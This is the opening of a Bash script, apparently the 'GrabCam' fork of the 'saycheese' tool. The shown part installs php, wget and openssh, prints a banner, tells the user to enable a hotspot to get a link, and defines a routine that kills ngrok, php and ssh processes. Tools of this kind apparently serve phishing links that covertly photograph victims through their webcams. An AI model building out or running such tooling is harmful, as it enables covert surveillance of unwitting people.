#!/bin/bash
# coded by: github.com/thelinuxchoice/saycheese
# This script modified by Noob Hackers
#@@2222222
# Hearlty thanks for linuxchoice
# If you use any part from this code, giving me the credits. Read the Lincense!
# Maintained by github.com/T-Dynamos
clear

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Installing."; apr install php -y && clear; }

command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Installing."; apt install wget -y && clear; }

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require openssh but it's not installed. Installing ."; apt install openssh -y && clear ; }

trap 'printf "\n";stop' 2

banner() {

echo '

                             __
                         __ /_/\___
                        /__/[]\/__/|o-_
                        |    _     ||   -_  
                        |  ((_))   ||     -_
                        |__________|/
             ___  ____   __   ____   ___   __   _  _ 
            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.1 ' |lolcat

                                                                               
echo " "
printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"

printf "\n"

echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
                   OR ELSE YOU DONT GET LINK....!"

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
